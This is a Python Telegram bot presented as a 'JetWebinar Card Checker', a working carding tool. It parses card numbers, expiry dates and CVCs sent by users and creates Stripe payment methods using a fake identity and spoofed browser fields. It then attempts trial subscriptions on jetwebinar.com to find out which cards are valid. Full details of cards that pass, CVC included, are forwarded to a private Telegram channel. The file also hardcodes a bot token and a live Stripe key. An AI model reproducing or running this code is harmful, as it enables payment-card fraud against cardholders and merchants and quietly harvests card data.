import telebot
import requests
import random
import string
import re

JETWEBINAR_BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
CHANNEL_ID = -1002170961342
bot = telebot.TeleBot(JETWEBINAR_BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_XwmzQS8EjYVv6D6ff4ycSP8W"

def extract_card_details(text):
    # Accepts any format: 4242 4242 4242 4242 12/34 567, 5275150097242499|09|28|575, etc.
    card = re.search(r'\d{13,19}', text.replace(" ", ""))
    cvc = re.search(r'(\d{3,4})(?!.*\d)', text)
    exp = re.search(r'(\d{1,2})[\/|\-| ](\d{2,4})', text)
    return {
        "card_number": card.group() if card else None,
        "exp_month": exp.group(1) if exp else None,
        "exp_year": exp.group(2) if exp else None,
        "cvc": cvc.group(1) if cvc else None
    }

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 JetWebinar Card Checker\n"
        "Send card in any format (spaces, slashes, pipes, etc)."
    )

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    try:
        details = extract_card_details(message.text)
        if not all(details.values()):
            bot.reply_to(message, "❌ Could not extract all card details. Please try again.")
            return

        email = generate_random_email()
        phone = "3144740104"
        name = "Peshang Salam"
        postal_code = "10080"

        # 1. Create Stripe payment method
        stripe_data = {
            "type": "card",
            "billing_details[name]": name,
            "billing_details[email]": email,
            "billing_details[phone]": phone,
            "billing_details[address][postal_code]": postal_code,
            "card[number]": details["card_number"],
            "card[cvc]": details["cvc"],
            "card[exp_month]": details["exp_month"].zfill(2),
            "card[exp_year]": details["exp_year"][-2:] if len(details["exp_year"]) > 2 else details["exp_year"],
            "key": STRIPE_PUBLISHABLE_KEY,
            "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
            "time_on_page": str(random.randint(10000, 99999)),
            "referrer": "https://www.jetwebinar.com"
        }
        stripe_resp = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=stripe_data,
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/"
            }
        )
        stripe_json = stripe_resp.json()
        pm_id = stripe_json.get("id", "")

        if "error" in stripe_json or not pm_id:
            bot.reply_to(message, f"❌ Card Declined (Stripe):\n{stripe_json.get('error', {}).get('message', stripe_json)}")
            return

        # 2. Send to JetWebinar
        jetwebinar_payload = {
            "name": name,
            "email": email,
            "phone": phone,
            "planId": "plan_basic_001",
            "paymentMethodId": pm_id,
            "isAnnual": False
        }
        jetwebinar_resp = requests.post(
            "https://www.jetwebinar.com/trial/api/create-subscription",
            json=jetwebinar_payload,
            headers={
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://www.jetwebinar.com",
                "referer": "https://www.jetwebinar.com/trial/?p=500&t=a"
            }
        )
        resp_json = jetwebinar_resp.json()

        if "error" in resp_json:
            bot.reply_to(message, f"❌ Card Declined (JetWebinar):\n{resp_json.get('error', resp_json.get('message', 'Unknown error'))}")
        elif resp_json.get("success") is True:
            subscription_id = resp_json.get("subscriptionId", "N/A")
            success_msg = (
                f"✅ JetWebinar Payment Successful!\n"
                f"Card: {details['card_number']} | {details['exp_month']}/{details['exp_year']} | {details['cvc']}\n"
                f"Email: {email}\n"
                f"Subscription ID: {subscription_id}\n"
                f"Full Response:\n{resp_json}"
            )
            bot.reply_to(message, "✅ Your Card Was Added")
            bot.send_message(CHANNEL_ID, success_msg)
        else:
            bot.reply_to(message, f"Unexpected response:\n{resp_json}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

bot.infinity_polling()